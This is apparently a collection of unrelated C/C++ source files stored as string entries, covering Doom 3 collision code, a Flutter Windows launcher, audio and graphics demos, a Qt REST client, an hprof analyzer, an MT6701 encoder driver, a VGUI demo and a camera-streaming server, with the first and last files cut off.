    "/*\n===========================================================================\n\nDoom 3 GPL Source Code\nCopyright (C) 1999-2011 id Software LLC, a ZeniMax Media company.\n\nThis file is part of the Doom 3 GPL Source Code (\"Doom 3 Source Code\").\n\nDoom 3 Source Code is free software: you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nDoom 3 Source Code is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with Doom 3 Source Code.  If not, see <http://www.gnu.org/licenses/>.\n\nIn addition, the Doom 3 Source Code is also subject to certain additional terms. You should have received a copy of these additional terms immediately following the terms and conditions of the GNU General Public License which accompanied the Doom 3 Source Code.  If not, please request a copy in writing from id Software at the address below.\n\nIf you have questions concerning this license or the applicable additional terms, you may contact in writing id Software LLC, c/o ZeniMax Media Inc., Suite 120, Rockville, Maryland 20850 USA.\n\n===========================================================================\n*/\n\n/*\n===============================================================================\n\n\tTrace model vs. polygonal model collision detection.\n\n===============================================================================\n*/\n\n#include \"precompiled.h\"\n#pragma hdrstop\n\n#include \"CollisionModel_local.h\"\n\n\n/*\n===============================================================================\n\nVisualisation code\n\n===============================================================================\n*/\n\nconst char *cm_contentsNameByIndex[] = {\n// HUMANHEAD: Redid these as they were out of sync\n\t\"none\",\t\t\t\t\t\t\t// \n\t\"solid\",\t\t\t\t\t\t// bit 0\n\t\"opaque\",\t\t\t\t\t\t// 1\n\t\"water\",\t\t\t\t\t\t// 2\n\t\"playerclip\",\t\t\t\t\t// 3\n\t\"monsterclip\",\t\t\t\t\t// 4\n\t\"moveableclip\",\t\t\t\t\t// 5\n\t\"ikclip\",\t\t\t\t\t\t// 6\n\t\"blood\",\t\t\t\t\t\t// 7\n\t\"body\",\t\t\t\t\t\t\t// 8\n\t\"projectile\",\t\t\t\t\t// 9\n\t\"corpse\",\t\t\t\t\t\t// 10\n\t\"rendermodel\",\t\t\t\t\t// 11\n\t\"trigger\",\t\t\t\t\t\t// 12\n\t\"aas_solid\",\t\t\t\t\t// 13\n\t\"aas_obstacle\",\t\t\t\t\t// 14\n\t\"flashlight_trigger\",\t\t\t// 15\n\n\t// HUMANHEAD pdm: added our contents\n\t\"forcefield\",\t\t\t\t\t// 16\n\t\"spiritbridge\",\t\t\t\t\t// 17\n\t\"areaportal\",\t\t\t\t\t// 18\n\t\"nocsg\",\t\t\t\t\t\t// 19\n\t\"block_radiusdamage\",\t\t\t// 20\n\t\"shootable\",\t\t\t\t\t// 21\n\t\"deathvolume\",\t\t\t\t\t// 22\n\t\"vehicleclip\",\t\t\t\t\t// 23\n\t\"owner_to_owner\",\t\t\t\t// 24\n\t\"game_portal\",\t\t\t\t\t// 25\n\t\"shootablebyarrow\",\t\t\t\t// 26\n\t\"hunterclip\",\t\t\t\t\t// 27\n\n\t// END HUMANHEAD\n\tNULL\n};\n\nint cm_contentsFlagByIndex[] = {\n// HUMANHEAD: Redid these as they were out of sync\n\t-1,\t\t\t\t\t\t\t\t// -1\n\tCONTENTS_SOLID,\t\t\t\t\t// bit 0\n\tCONTENTS_OPAQUE,\t\t\t\t// 1\n\tCONTENTS_WATER,\t\t\t\t\t// 2\n\tCONTENTS_PLAYERCLIP,\t\t\t// 3\n\tCONTENTS_MONSTERCLIP,\t\t\t// 4\n\tCONTENTS_MOVEABLECLIP,\t\t\t// 5\n\tCONTENTS_IKCLIP,\t\t\t\t// 6\n\tCONTENTS_BLOOD,\t\t\t\t\t// 7\n\tCONTENTS_BODY,\t\t\t\t\t// 8\n\tCONTENTS_PROJECTILE,\t\t\t// 9\n\tCONTENTS_CORPSE,\t\t\t\t// 10\n\tCONTENTS_RENDERMODEL,\t\t\t// 11\n\tCONTENTS_TRIGGER,\t\t\t\t// 12\n\tCONTENTS_AAS_SOLID,\t\t\t\t// 13\n\tCONTENTS_AAS_OBSTACLE,\t\t\t// 14\n\tCONTENTS_FLASHLIGHT_TRIGGER,\t// 15\n\n\t// HUMANHEAD pdm: added our contents\n\tCONTENTS_FORCEFIELD,\t\t\t// 16\n\tCONTENTS_SPIRITBRIDGE,\t\t\t// 17\n\tCONTENTS_AREAPORTAL,\t\t\t// 18\n\tCONTENTS_NOCSG,\t\t\t\t\t// 19\n\tCONTENTS_BLOCK_RADIUSDAMAGE,\t// 20\n\tCONTENTS_SHOOTABLE,\t\t\t\t// 21\n\tCONTENTS_DEATHVOLUME,\t\t\t// 22\n\tCONTENTS_VEHICLECLIP,\t\t\t// 23\n\tCONTENTS_OWNER_TO_OWNER,\t\t// 24\n\tCONTENTS_GAME_PORTAL,\t\t\t// 25\n\tCONTENTS_SHOOTABLEBYARROW,\t\t// 26\n\tCONTENTS_HUNTERCLIP,\t\t\t// 27\n\t// END HUMANHEAD\n\t0\n};\n\nidCVar cm_drawMask(\t\t\t\"cm_drawMask\",\t\t\t\"none\",\t\tCVAR_GAME,\t\t\t\t\"collision mask\", cm_contentsNameByIndex, idCmdSystem::ArgCompletion_String<cm_contentsNameByIndex> );\nidCVar cm_drawColor(\t\t\"cm_drawColor\",\t\t\t\"1 0 0 .5\",\tCVAR_GAME,\t\t\t\t\"color used to draw the collision models\" );\nidCVar cm_drawFilled(\t\t\"cm_drawFilled\",\t\t\"0\",\t\tCVAR_GAME | CVAR_BOOL,\t\"draw filled polygons\" );\nidCVar cm_drawInternal(\t\t\"cm_drawInternal\",\t\t\"1\",\t\tCVAR_GAME | CVAR_BOOL,\t\"draw internal edges green\" );\nidCVar cm_drawNormals(\t\t\"cm_drawNormals\",\t\t\"0\",\t\tCVAR_GAME | CVAR_BOOL,\t\"draw polygon and edge normals\" );\nidCVar cm_backFaceCull(\t\t\"cm_backFaceCull\",\t\t\"0\",\t\tCVAR_GAME | CVAR_BOOL,\t\"cull back facing polygons\" );\nidCVar cm_debugCollision(\t\"cm_debugCollision\",\t\"0\",\t\tCVAR_GAME | CVAR_BOOL,\t\"debug the collision detection\" );\n\nstatic idVec4 cm_color;\n\n/*\n================\nidCollisionModelManagerLocal::ContentsFromString\n================\n*/\nint idCollisionModelManagerLocal::ContentsFromString( const char *string ) const {\n\tint i, contents = 0;\n\tidLexer src( string, idStr::Length( string ), \"ContentsFromString\" );\n\tidToken token;\n\n\twhile( src.ReadToken( &token ) ) {\n\t",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_animation3\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <milg/audio.hpp>\n#include <milg/milg.hpp>\n\n#include <imgui.h>\n#include <map>\n#include <memory>\n\nstatic std::map<std::string, std::shared_ptr<milg::audio::Sound>> sounds;\nstatic std::shared_ptr<milg::audio::VocoderNode>                  vocoder_node;\n\nclass AudioLayer : public milg::Layer {\n    void on_attach() override {\n        milg::audio::set_volume(.5f);\n\n        vocoder_node = std::make_shared<milg::audio::VocoderNode>();\n        vocoder_node->attach_output<0, 0>(milg::audio::get_endpoint());\n\n        for (auto &[name, asset] : milg::asset_store::get_assets(milg::Asset::Type::SOUND)) {\n            sounds[name] = std::make_shared<milg::audio::Sound>(asset->get_data(), asset->get_size());\n        }\n    }\n\n    void on_detach() override {\n        sounds.clear();\n    }\n\n    void on_update(float delta) override {\n        if (ImGui::Begin(\"Audio\")) {\n            ImGui::SeparatorText(\"Master volume\");\n\n            auto master_volume = milg::audio::get_volume();\n\n            if (ImGui::SliderFloat(\"##master_vol\", &master_volume, 0.f, 1.f)) {\n                milg::audio::set_volume(master_volume);\n            }\n\n            ImGui::SeparatorText(\"Loaded sounds\");\n\n            int        i              = 0;\n            static int selected_index = 0;\n\n            for (auto &[key, sound] : sounds) {\n                bool selected = selected_index == i;\n                auto volume   = sound->get_volume();\n\n                if (ImGui::ArrowButton(std::format(\"##play_{}\", key).c_str(), ImGuiDir_Right)) {\n                    vocoder_node->detach_input(1);\n                    sound->attach_output<0, 1>(vocoder_node);\n                    sound->play();\n                }\n                ImGui::SameLine();\n                ImGui::PushItemWidth(100);\n                if (ImGui::SliderFloat(std::format(\"##vol_{}\", key).c_str(), &volume, 0.f, 1.f)) {\n                    sound->set_volume(volume);\n                }\n                ImGui::SameLine();\n                if (ImGui::Selectable(key.c_str(), selected)) {\n                    selected_index = i;\n                }\n\n                i++;\n            }\n\n            ImGui::End();\n        }\n    }\n\n    void on_event(milg::Event &event) override {\n    }\n};\n\nclass AudioPlayground : public milg::Application {\npublic:\n    AudioPlayground(int argc, char **argv, const milg::WindowCreateInfo &window_info)\n        : Application(argc, argv, window_info) {\n        push_layer(new AudioLayer());\n    }\n\n    ~AudioPlayground() {\n    }\n};\n\nint main(int argc, char **argv) {\n    milg::WindowCreateInfo window_info = {\n        .title  = \"Milg\",\n        .width  = 1600,\n        .height = 900,\n    };\n\n    AudioPlayground app(argc, argv, window_info);\n    app.run();\n\n    return 0;\n}\n",
    "#include <string>\n#include <vector>\n\nclass Solution {\n    public:\n        std::string convert(std::string s, int numRows) {\n            /* Optimization with this if \n             * and we also avoid the vector to go out of range\n             */\n            if(numRows == 1)\n                return s;\n            /* Declare the vector that lets us codify the message */\n            std::vector<std::string> aux(numRows);\n            /* Direction\n             *  up -> true\n             *  down -> false\n             */\n            bool direction = true;\n            /* auxiliar variable to let us iterate over \n             * the multiple string in the array simulating the zig-zag pattern\n             */\n            int i = 0;\n            for(char c : s) {\n                /* simulates the hasNext in an iterator */\n                if(i == numRows-1 || i == 0)\n                    direction = !direction;\n                std::string &row = direction? aux.at(i--) : aux.at(i++);\n                /* pushes the next element */\n                row.push_back(c); \n            }\n            std::string zigzag; \n            /* after distributing s between all the strings in the auxiliar vector\n             * we create the final string\n             */\n            for(std::string s : aux) \n                zigzag.append(s);\n            /* return the final string */\n            return zigzag;\n        }  \n};\n",
    "#include \"quotesapi.h\"\n#include \"qeventloop.h\"\n#include \"qurl.h\"\n#include <QJsonObject>\n#include <QJsonDocument>\n#include <QNetworkReply>\n#include <QNetworkRequest>\n#include <QUrlQuery>\n\nQuotesApi::QuotesApi(std::shared_ptr<Connection> conn, std::shared_ptr<User> user)\n{\n    _authenticate = new QuotesLogApi(conn, user);\n}\n\nQuotesApi::~QuotesApi()\n{\n    delete _authenticate;\n}\n\nAPI_METHOD(addQuote, \"/inside/add-quote\", SingleQuoteModel *data)    \n    QJsonDocument doc = data->serializeToQJsonDocument();\n    QByteArray body = doc.toJson();\nBODY_REQUEST(post)\n\nAPI_METHOD(addOwner, \"/inside/add-owner\", std::pair<QString, QString> owner)\n    QJsonObject json\n        {\n            {\"owner\", owner.first},\n            {\"description\", owner.second}\n        };\n    QJsonDocument doc(json);\n    QByteArray body = doc.toJson();\nBODY_REQUEST(post)\n\nAPI_METHOD(updateQuote, \"/inside/update-quote\", SingleQuoteModel* changed, SingleQuoteModel* original)\n    assert((changed->id() == original->id()) && (changed->cites() == original->cites()));\n    bool attrsChanged    = changed->attrs() != original->attrs();\n    bool featuresChanged = changed->features() != original->features();\n    bool quoteChanged    = (changed->is_obscene() != original->is_obscene()) ||\n                           (changed->quote() != original->quote()) ||\n                           (changed->owner() != original->owner());\n    QJsonObject json\n        {\n            {\"quote\", changed->serializeToQJsonDocument().object()},\n            {\"attrsChanged\", attrsChanged},\n            {\"featuresChanged\", featuresChanged},\n            {\"quoteChanged\", quoteChanged}\n        };\n    QByteArray body = QJsonDocument(json).toJson();\nBODY_REQUEST(put)\n\nAPI_METHOD(deleteQuote, \"/inside/delete-quote\", int id)\n    QUrlQuery param;\n    param.addQueryItem(\"id\", QString::number(id));\nNO_BODY_REQUEST(deleteResource)\n\n\nAPI_METHOD(getCoreTable, \"/quotes/core-table\", CoreTables ct)\n    QString table;\n    switch(ct)\n    {\n    case CoreTables::attrs:\n        table = \"attrs\"; break;\n\n    case CoreTables::features:\n        table = \"features\"; break;\n\n    case CoreTables::owners:\n        table = \"owners\"; break;\n    }\n\n    QUrlQuery param;\n    param.addQueryItem(\"table\", table);\nNO_BODY_REQUEST(get)\n\nAPI_METHOD(getQuoteCards, \"/quotes/owners\", QString owner)\n    QUrlQuery param;\n    param.addQueryItem(\"owner\", owner);\nNO_BODY_REQUEST(get)\n\nAPI_METHOD(getOwnedCards, \"/inside/owning\", void)\nQUrlQuery param;\nNO_BODY_REQUEST(get)\n\nAPI_METHOD(getFavouriteCards, \"/inside/fav-quotes\", void)\nQUrlQuery param;\nNO_BODY_REQUEST(get)\n\nAPI_METHOD(addFavouriteCard, \"/inside/add-fav\", SingleQuoteModel* quote)\n    QJsonDocument doc = quote->serializeToQJsonDocument();\n    QByteArray body = doc.toJson();\nBODY_REQUEST(put)\n\nAPI_METHOD(removeFavouriteCard, \"/inside/remove-fav\", int quoteId)\n    QUrlQuery param;\n    param.addQueryItem(\"quoteId\", QString::number(quoteId));\nNO_BODY_REQUEST(deleteResource)\n\nAPI_METHOD(searchQuote, \"/quotes/search\", const QString& quote)\n    QUrlQuery param;\n    param.addQueryItem(\"quote\", quote);\nNO_BODY_REQUEST(get)",
    "#include \"ofApp.h\"\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::setup() {\r\n\r\n\tofSetFrameRate(25);\r\n\tofSetWindowTitle(\"openFrameworks\");\r\n\r\n\tofBackground(239);\r\n\tofSetColor(39);\r\n\tofEnableDepthTest();\r\n\r\n\tauto ico_sphere = ofIcoSpherePrimitive(200, 8);\r\n\tthis->triangle_list.insert(this->triangle_list.end(), ico_sphere.getMesh().getUniqueFaces().begin(), ico_sphere.getMesh().getUniqueFaces().end());\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::update() {\r\n\r\n\tofSeedRandom(39);\r\n\r\n\tthis->mesh.clear();\r\n\r\n\tauto noise_seed = ofRandom(1000);\r\n\tfor (int i = 0; i < this->triangle_list.size(); i++) {\r\n\r\n\t\tglm::vec3 avg = (this->triangle_list[i].getVertex(0) + this->triangle_list[i].getVertex(1) + this->triangle_list[i].getVertex(2)) / 3;\r\n\t\tauto noise_value = ofNoise(noise_seed, avg.y * 0.01 + ofGetFrameNum() * 0.03, avg.x * 0.01, avg.z * 0.01);\r\n\r\n\t\tif (noise_value < 0.47 || noise_value > 0.53) { continue; }\r\n\r\n\t\tvector<glm::vec3> vertices;\r\n\r\n\t\tvertices.push_back(this->triangle_list[i].getVertex(0));\r\n\t\tvertices.push_back(this->triangle_list[i].getVertex(1));\r\n\t\tvertices.push_back(this->triangle_list[i].getVertex(2));\r\n\r\n\t\tthis->mesh.addVertices(vertices);\r\n\r\n\t\tofColor color;\r\n\t\tcolor.setHsb(ofMap(ofNoise(glm::vec4(noise_seed, avg * 0.005)), 0, 1, 100, 192), 130, 255);\r\n\r\n\t\tfor (int k = 0; k < vertices.size(); k++) {\r\n\r\n\t\t\tthis->mesh.addColor(color);\r\n\t\t}\r\n\r\n\t\tthis->mesh.addTriangle(this->mesh.getNumVertices() - 1, this->mesh.getNumVertices() - 2, this->mesh.getNumVertices() - 3);\r\n\t}\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::draw() {\r\n\r\n\tthis->cam.begin();\r\n\tofRotateY(ofGetFrameNum() * 0.35);\r\n\r\n\tthis->mesh.draw();\r\n\r\n\tofDrawSphere(199);\r\n\r\n\tthis->cam.end();\r\n\r\n\t/*\r\n\tint start = 1;\r\n\tif (ofGetFrameNum() > start) {\r\n\r\n\t\tostringstream os;\r\n\t\tos << setw(4) << setfill('0') << ofGetFrameNum() - start;\r\n\t\tofImage image;\r\n\t\timage.grabScreen(0, 0, ofGetWidth(), ofGetHeight());\r\n\t\timage.saveImage(\"image/cap/img_\" + os.str() + \".jpg\");\r\n\t\tif (ofGetFrameNum() - start >= 25 * 20) {\r\n\r\n\t\t\tstd::exit(1);\r\n\t\t}\r\n\t}\r\n\t*/\r\n}\r\n\r\n//--------------------------------------------------------------\r\nint main() {\r\n\r\n\tofSetupOpenGL(720, 720, OF_WINDOW);\r\n\tofRunApp(new ofApp());\r\n}",
    "#include \"hprof_data.h\"\n\n#include <utility>\n\nusing hprof_analyzer::u4, hprof_analyzer::class_info_t, std::vector, std::unique_ptr,\n    hprof_analyzer::primitive_array_info_t, hprof_analyzer::object_array_info_t,\n    hprof_analyzer::instance_info_t, std::unordered_map;\n\nvoid hprof_analyzer::HprofData::add_string(int64_t id, const std::string &str) {\n  this->string_map_.insert({id, str});\n}\n\nstd::string *hprof_analyzer::HprofData::get_string(int64_t id) {\n  return &string_map_.at(id);\n}\n\nvoid hprof_analyzer::HprofData::add_class_string_id(int64_t id, int64_t class_string_id) {\n  class_string_id_map.insert({id, class_string_id});\n}\n\nint64_t hprof_analyzer::HprofData::get_class_string_id(int64_t id) {\n  return class_string_id_map.at(id);\n}\n\nclass_info_t *hprof_analyzer::HprofData::get_class(int64_t id) {\n  return &class_map_.at(id);\n}\n\nu4 hprof_analyzer::HprofData::get_identifier_size() {\n  return header_->identifiers_size;\n}\n\nvoid hprof_analyzer::HprofData::add_root(int64_t id) {\n  roots_.insert(id);\n}\n\nbool hprof_analyzer::HprofData::is_root(int64_t id) {\n  return roots_.contains(id);\n}\n\nvoid hprof_analyzer::HprofData::add_class(int64_t id, int64_t parent_id, int64_t size,\n                                          unique_ptr<vector<constant_pool_record_t>> constant_pool,\n                                          unique_ptr<vector<static_field_record_t>> static_fields,\n                                          unique_ptr<vector<field_record_t>> instance_fields) {\n  class_map_.insert({id, class_info_t{id, 0, parent_id, 0, 0, size, std::move(constant_pool), std::move(static_fields),\n                                      std::move(instance_fields)}});\n}\n\nstd::unordered_map<int64_t, hprof_analyzer::class_info_t> *hprof_analyzer::HprofData::get_classes() {\n  return &class_map_;\n}\n\nvoid hprof_analyzer::HprofData::add_primitive_array(const primitive_array_info_t &record) {\n  primitive_array_map_.insert({record.id, record});\n}\nvoid hprof_analyzer::HprofData::add_object_array(const object_array_info_t &record) {\n  object_array_map_.insert({record.id, record});\n}\n\nprimitive_array_info_t *hprof_analyzer::HprofData::get_primitive_array(int64_t id) {\n  if (auto search = primitive_array_map_.find(id); search != primitive_array_map_.end()) {\n    return &search->second;\n  }\n  return nullptr;\n}\n\nobject_array_info_t *hprof_analyzer::HprofData::get_object_array(int64_t id) {\n  if (auto search = object_array_map_.find(id); search != object_array_map_.end()) {\n    return &search->second;\n  }\n  return nullptr;\n}\n\nstd::unordered_map<int64_t, hprof_analyzer::object_array_info_t> *hprof_analyzer::HprofData::get_object_arrays() {\n  return &object_array_map_;\n}\n\nstd::unordered_map<int64_t,\n                   hprof_analyzer::primitive_array_info_t> *hprof_analyzer::HprofData::get_primitive_arrays() {\n  return &primitive_array_map_;\n}\n\nvoid hprof_analyzer::HprofData::set_instances(std::unique_ptr<std::unordered_map<int64_t,\n                                                                                 instance_info_t>> instances) {\n  instances_ = std::move(instances);\n}\n\nunordered_map<int64_t, instance_info_t> *hprof_analyzer::HprofData::get_instances() {\n  return instances_.get();\n}\n",
    "#include \"MT6701.h\"\n#include <Wire.h>\n\n/*\n * A simple library to obtain MT6701 sensor data through i2c.\n * Default i2c address for encoder is 0x06, SDA->pin A4, SCL->pin A5. For ESP32, SDA->GPIO21, SCL->GPIO22.\n * MT6701 datasheet: https://www.lcsc.com/datasheet/lcsc_datasheet_2109011830_Magn-Tek-MT6701CT-STD_C2856764.pdf\n * Reference tutorial for code: https://curiousscientist.tech/blog/as5600-magnetic-position-encoder (Thanks!)\n */\n\nMT6701::MT6701(int8_t dir, bool zero_angle){\n  _dir = dir;\n  _zero_angle = zero_angle;\n}\n\n// init: begin I2C comminication, zero starting angle\nvoid MT6701::initEncoder(){\n  Wire.begin();\n  Wire.setClock(400000L);\n  Wire.beginTransmission(I2C_AD);\n  while(Wire.endTransmission() != 0); // Blocks until encoder acknowledges i2c request  \n  totalAngle = 0;\n  numberOfTurns = 0;\n  startAngle = _zero_angle ? getRawAngle() : 0;\n}\n\n// get new 14-bit raw sensor value\nint MT6701::getRawAngle() {\n\n  Wire.beginTransmission(I2C_AD);\n  Wire.write(0x03);\n  Wire.endTransmission();\n  Wire.requestFrom(I2C_AD, 1);\n  while(Wire.available() == 0 ); // wait until i2c bus available\n  highbyte = Wire.read();\n\n  Wire.beginTransmission(I2C_AD);\n  Wire.write(0x04);\n  Wire.endTransmission();\n  Wire.requestFrom(I2C_AD, 1);\n  while(Wire.available() == 0 );\n  lowbyte = Wire.read();\n\n  /*\n    register 0x03 returns bits <13:6> (highbyte), \n    register 0x04 returns bits <5:0> (lowbyte).\n\n    Bits:            |  7  |  6  |  5  |  4  |  3  |  2  |  1  |  0  | \n\n    0x03 (highbyte): |  13 |  12 |  11 |  10 |  9  |  8  |  7  |  6  |\n    0x04 (lowbyte):  |  5  |  4  |  3  |  2  |  1  |  0  | N/A | N/A | \n\n    To join highbyte & lowbyte into 14-bit value, shift highbyte left by 6 & lowbyte right by 2, \n    then join using OR (|) operator\n  */\n\n  highbyte <<= 6;\n  rawAngle = highbyte | (lowbyte >> 2);\n\n  return rawAngle; // int value 0-16383\n}\n\n// constrains raw angle in range 0-16383. Also corrects for direction & zeroing.\nint MT6701::correctAngle(){\n\n  offsetAngle = _zero_angle ? _dir * (rawAngle - startAngle) : _dir * rawAngle;\n\n  // if(_dir){\n  //   offsetAngle = _zero_angle ? -1 * (rawAngle - startAngle) : -1 * rawAngle;\n  // }\n  // else {\n  //   offsetAngle = _zero_angle ? (rawAngle - startAngle) : rawAngle;\n  // }\n\n  correctedRawAngle = (offsetAngle < 0) ? offsetAngle + 16384 : offsetAngle;\n  return correctedRawAngle; // int value 0-16383\n}\n\nfloat MT6701::getAbsoluteAngle() {\n  getRawAngle();\n  return correctAngle() * rawToRad;\n}\n\nfloat MT6701::getAbsoluteAngleDegrees() {\n  getRawAngle();\n  return correctAngle() * rawToDeg;\n}\n\nfloat MT6701::calculateTotalAngle() {\n  /*\n    Track number of turns by comparing quadrant occupied.\n\n      2 | 1\n    ---------\n      3 | 4\n\n    If angle was previously in quadrant 1 and is now in quadrant 4, means 1 clockwise cycle complete.\n    If angle was previously in quadrant 4 and is now in quadrant 1, means 1 counter clockwise cycle complete.\n  */\n  getRawAngle();\n  correctAngle();\n\n  // assign quadrant number based on angle\n  quadrant = (correctedRawAngle >= 0 && correctedRawAngle <= 4096) ? 1 :\n             (correctedRawAngle >= 12288 && correctedRawAngle <= 16384) ? 4 : 2;\n\n  if(quadrant != prevQuadrant) {\n    if(quadrant == 1 && prevQuadrant == 4) {\n      numberOfTurns ++;\n    }\n    else if(quadrant == 4 && prevQuadrant == 1) {\n      numberOfTurns --;\n    }\n\n    prevQuadrant = quadrant;\n  }\n  \n  // converted to total radians \n  totalAngle = numberOfTurns * _2PI + correctedRawAngle * rawToRad; \n\n  return totalAngle; \n}\n\nfloat MT6701::getAngle() {\n  return calculateTotalAngle();\n}\n\nfloat MT6701::getAngleDegrees() {\n  return calculateTotalAngle() * radToDeg;\n}\n\n",
    "//========= Copyright Valve Corporation, All rights reserved. ============//\n//\n// Purpose: \n//\n// $NoKeywords: $\n//=============================================================================//\n#include \"DemoPage.h\"\n\n#include <VGUI/IVGui.h>\n#include <vgui_controls/Controls.h>\n#include <Keyvalues.h>\n#include <vgui_controls/FileOpenDialog.h>\n\nusing namespace vgui;\n\n\nclass FileOpenDemo: public DemoPage\n{\n\tpublic:\n\t\tFileOpenDemo(Panel *parent, const char *name);\n\t\t~FileOpenDemo();\n\n\t\tvoid SetVisible(bool status);\n\t\n\tprivate:\n\t\tvoid OnFileSelected(const char *fullpath);\n\n\t\tDHANDLE<FileOpenDialog> m_hFileDialog;\n\n\t\tDECLARE_PANELMAP();\t\t\n};\n\n//-----------------------------------------------------------------------------\n// Purpose: Constructor\n//-----------------------------------------------------------------------------\nFileOpenDemo::FileOpenDemo(Panel *parent, const char *name) : DemoPage(parent, name)\n{\n}\n\n//-----------------------------------------------------------------------------\n// Purpose: Destructor\n//-----------------------------------------------------------------------------\nFileOpenDemo::~FileOpenDemo()\n{\n}\n\n//-----------------------------------------------------------------------------\n// Purpose: When we make this this demo page visible we make the dialog visible.\n//-----------------------------------------------------------------------------\nvoid FileOpenDemo::SetVisible(bool status)\n{\n\tif (status)\n\t{\n\t\tif (!m_hFileDialog.Get())\n\t\t{\n\t\t\t// Pop up the dialog\n\t\t\tFileOpenDialog *pFileDialog = new FileOpenDialog (NULL, \"Find the TestFile\", true);\n\t\t\tm_hFileDialog = pFileDialog;\n\t\t\tm_hFileDialog->AddActionSignalTarget(this);\n\t\t}\n\t\tm_hFileDialog->DoModal(false);\n\t}\t\n}\n\n//-----------------------------------------------------------------------------\n// Purpose: When a file is selected print out its full path in the debugger\n//-----------------------------------------------------------------------------\nvoid FileOpenDemo::OnFileSelected(const char *fullpath)\n{\n\tivgui()->DPrintf(\"File selected\\n\");\n\tivgui()->DPrintf(fullpath);\n\tivgui()->DPrintf(\"\\n\");\n}\n\nMessageMapItem_t FileOpenDemo::m_MessageMap[] =\n{\n\tMAP_MESSAGE_CONSTCHARPTR(FileOpenDemo, \"FileSelected\", OnFileSelected, \"fullpath\"), \n};\n\nIMPLEMENT_PANELMAP(FileOpenDemo, DemoPage);\n\n\nPanel* FileOpenDemo_Create(Panel *parent)\n{\n\treturn new FileOpenDemo(parent, \"FileOpenDialogDemo\");\n}\n\n\n",
    "#include<iostream>\nusing namespace std;\n\ntemplate<typename T>\nclass SmartArray\n{\n    T * m_ptrArr;\n    size_t m_size;\n    size_t m_capacity;\npublic:\n    SmartArray(size_t count):m_ptrArr(new T[count]),m_size(0), m_capacity(count){}\n    ~SmartArray()\n    {\n        delete [] m_ptrArr;\n        m_ptrArr = nullptr;\n    }\n    T&operator [] (int index)\n    {\n        if(index >= m_size || index < 0)\n        {\n            throw std::out_of_range(\"Invalid index\");\n        }\n        return m_ptrArr[index];\n    }\n\n    void push_back(const T & elem)\n    {\n        if (m_size < m_capacity)\n        {\n            m_ptrArr[m_size] = elem;\n\n        }\n        else\n        {\n            if(!m_capacity)\n            {\n                m_capacity = 1;\n            }\n            m_capacity *= 2;\n            T * NewPtr = new T[m_capacity];\n            for (size_t i= 0; i< m_size; i++)\n            {\n                NewPtr[i] = m_ptrArr[i];\n\n            }\n\n            delete [] m_ptrArr;\n            m_ptrArr = NewPtr;\n            NewPtr = nullptr;\n            m_ptrArr[m_size] = elem;\n        }\n        m_size++;\n    }\n    void Print()\n    {\n        for(size_t i = 0; i< m_size; i++)\n        {\n            std::cout << m_ptrArr[i] << \" \" ;\n        }\n    }\n\n    SmartArray& operator = (SmartArray & arr)\n    {\n        if(this != &arr)\n        {\n            if (m_ptrArr!= nullptr)\n            {\n\n                delete [] m_ptrArr;\n                m_ptrArr = nullptr;\n            }\n            m_ptrArr = new T[arr.m_capacity];\n            m_capacity = arr.m_capacity;\n            m_size = arr.m_size;\n            for (size_t i = 0; i< m_size; i++)\n            {\n                m_ptrArr[i] = arr[i];\n            }}\n        return *this;\n\n    }\n};\n\nint main()\n{\n\n    try {\n\n        SmartArray <int> arr(0);\n\n        arr.push_back(9);\n        arr.push_back(8);\n        // arr.Print();\n        // std::cout << arr[0];\n\n        SmartArray <int> arr1(3);\n\n        arr1.push_back(98);\n        arr1.push_back(897);\n\n        arr = arr1;\n        arr.Print();\n    }\n    catch (const std::exception& ex) {\n        std::cout << ex.what() << std::endl;\n    }\n\n    return 0;\n}",
    "#include \"server.hpp\"\n\n#include <uWebSockets/App.h>\n\n#include <atomic>\n#include <chrono>\n#include <iostream>\n#include <nlohmann/json.hpp>\n#include <string>\n#include <thread>\n\n#include \"SimpleCam.hpp\"\n#include \"ThreadPool.hpp\"\n\nusing namespace std;\n\nstatic ThreadPool pool(1);\nstatic uWS::App *globalApp;\nstatic std::atomic<bool> is_streaming{false};\nstatic SimpleCam cam;\n\nstatic void handleNewFrame(const std::vector<unsigned char> &buffer, const std::vector<HailoDetectionPtr> &detections) {\n  auto loop = globalApp->getLoop();\n\n  // for (auto &detection : detections) {\n  //   if (detection->get_confidence() == 0) {\n  //     continue;\n  //   }\n\n  //   if (detection->get_label() == \"person\") {\n  //     std::cout << \"Hey it's a person\" << std::endl;\n  //   }\n  // }\n\n  loop->defer([buffer]() {\n    auto stringView = std::string_view((char *)buffer.data(), buffer.size());\n    uWS::OpCode opCode = uWS::BINARY;\n    globalApp->publish(\"image-stream\", stringView, opCode);\n  });\n}\n\ntemplate <bool SSL>\nvoid logRequest(uWS::HttpResponse<SSL> *res, uWS::HttpRequest *req) {\n  cout << \"Incoming request: \" << 